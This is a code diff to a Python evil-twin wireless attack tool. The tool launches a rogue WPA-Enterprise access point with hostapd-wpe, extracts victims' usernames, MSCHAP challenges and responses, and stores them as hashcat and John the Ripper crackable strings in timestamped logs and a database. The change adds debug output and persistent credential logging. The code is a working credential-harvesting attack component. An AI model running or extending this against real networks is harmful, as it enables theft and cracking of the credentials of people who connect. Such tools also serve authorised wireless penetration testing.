@@ -5,7 +5,7 @@
 # Version: v 1.08252017
 
 try:
-	import os, sys, time, signal, threading
+	import os, sys, time, datetime, signal, threading
 	from subprocess import Popen, PIPE
 	from theme import *
 except Exception as e:
@@ -21,12 +21,12 @@ try:
 	db = DB(conn)
 except Exception as e:
 	print(red('!') + 'Could not connect to database: ' +str(e))
-	sys.exit(1)	
+	sys.exit(1)
 
 class evilTwin(threading.Thread):
 	def __init__(self, interface, ssid, channel, macaddress, \
 	 certname, band, server_cert, private_key,\
-	 country, state, city, company, ou, email):
+	 country, state, city, company, ou, email, debug):
 		threading.Thread.__init__(self)
 		self.setDaemon(0) # Creates thread in non-daemon mode
 		self.interface = interface
@@ -44,6 +44,9 @@ class evilTwin(threading.Thread):
 		self.email = email
 		self.server_cert = server_cert
 		self.private_key = private_key
+		self.debug = debug
+		self.log_timestamp = '{:%Y-%m-%d_%H:%M:%S}'.format(datetime.datetime.now())
+
 
 	def run(self):
 		self.datafolders_check()
@@ -53,31 +56,39 @@ class evilTwin(threading.Thread):
 		self.sanity_check()
 		time.sleep(1.5)
 		p1 = Popen(['hostapd-wpe', 'data/hostapd-wpe/hostapd-wpe.conf'], stdout=PIPE)
-		print('\n [i] Real-time logs below:\n')
-		counter = 0
-		if counter <= 5:
-			for line in iter(p1.stdout.readline, ''):
-				counter+=1
-				# f.write(line)
+		print('\n [i] Real-time logs below:(Press Ctrl-C to quit)\n')
+		hashcat_log = 'data/eviltwin/%s_%s.hashcat' % (self.ssid, self.log_timestamp)
+		# counter = 0
+		# if counter <= 5:
+		for line in iter(p1.stdout.readline, ''):
+			# counter+=1
+			if not self.debug:
 				if "username" in line:
 					user = line.split()[1]
-					# sys.stdout.write(line)
 				elif 'challenge' in line: 
 					challenge = line.split()[1]
 				elif 'response' in line:
 					response = line.split()[1]
 				elif 'jtr' in line:
 					jtr = line.split()[2]
-					print(' Identity: %s' % (user))
-					print(' John: %s' % (jtr))
-					print(' Hashcat: %s::::%s:%s' % (user, response.translate(None, ':'), challenge.translate(None, ':')))
+					hashcat = '%s::::%s:%s\n' % (user, response.translate(None, ':'), challenge.translate(None, ':'))
+					print(green('*')+'Identity: %s' % (user))
+					print(green('*')+'Hashcat: %s::::%s:%s' % (user, response.translate(None, ':'), challenge.translate(None, ':')))
+					print(green('*')+'John: %s\n' % (jtr.rjust(5)))
+					with open(hashcat_log, 'a') as f1:
+						f1.write(hashcat)
 					# Commit to database
-		
+					db.eviltwin_commit(self.ssid, user, hashcat)
+			else:
+				sys.stdout.write(line)
+
+
 		# Obtain hostapd-wpe Process ID
 		global eviltwin_pid
 		eviltwin_pid=p1.pid
 		raw_input(red('!') + 'Press Enter to quit\n\n')
-		self.captured_creds()
+		# Commit to database
+		# self.captured_creds()
 		# Send the signal terminate HTTPS Serverprocess
 		os.kill(os.getpgid(eviltwin_pid), signal.SIGTERM)
 		# self.driver_fix()
@@ -87,7 +98,8 @@ class evilTwin(threading.Thread):
 		p1 = Popen(['which', 'hostapd-wpe'], stdout=PIPE)
 		if p1.communicate()[0]:
 			p2 = Popen(["dpkg-query", "-W", "-f", "${version}", "hostapd-wpe"], stdout=PIPE)
-			print(blue('i')+'Running hostapd-wpe %s' % (p2.communicate()[0]))
+			if self.debug:
+				print(blue('i')+'Running hostapd-wpe %s' % (p2.communicate()[0]))
 		else:
 			print(blue('i')+'Installing hostapd-wpe ...')
 			p3 = Popen(['apt-get install -y hostapd-wpe'], shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
@@ -143,17 +155,17 @@ class evilTwin(threading.Thread):
 		data[15]= 'channel=%s\n' % (self.channel)
 		data[8] = 'server_cert=%s\n' % (self.server_cert)
 		data[9] = 'private_key=%s\n' % (self.private_key)
-		data[19] = 'wpe_logfile=data/eviltwin/%s.log\n' % (self.ssid)
+		data[19] = 'wpe_logfile=data/eviltwin/%s_%s.log\n' % (self.ssid, self.log_timestamp)
 		data[183] = 'hw_mode=%s\n' % (self.band.lower())
 
 
-		print(green('*')+'EvilTwin Details:')
+		print(blue('*')+'EvilTwin Details:')
 		print('     AP Interface: %s' % (self.wirelessInt))
 		print('     SSID: %s' % (self.ssid))
 		print('     Band: %s' % (self.band))
 		print('     Channel: %s' % (self.channel))
 		print('     Certificate Name: %s' % (self.certname))
-		print('     Log saved to: data/eviltwin/%s.log' % (self.ssid))
+		print('     Log saved to: data/eviltwin/%s_%s.log' % (self.ssid, self.log_timestamp))
 		# print('     Server Cert Path: %s' % (self.server_cert))
 		# print('     Private Key Path: %s' % (self.private_key))
 		# Design Reference: 
@@ -195,7 +207,7 @@ class evilTwin(threading.Thread):
 	
 	def captured_creds(self):
 		ntlm_hash = ''
-		log = 'data/eviltwin/%s.log' % (self.ssid)
+		log = 'data/eviltwin/%s_%s.log' % (self.ssid, self.log_timestamp)
 		with open(log) as f1:
 			f1.readline()
 			for line in f1:
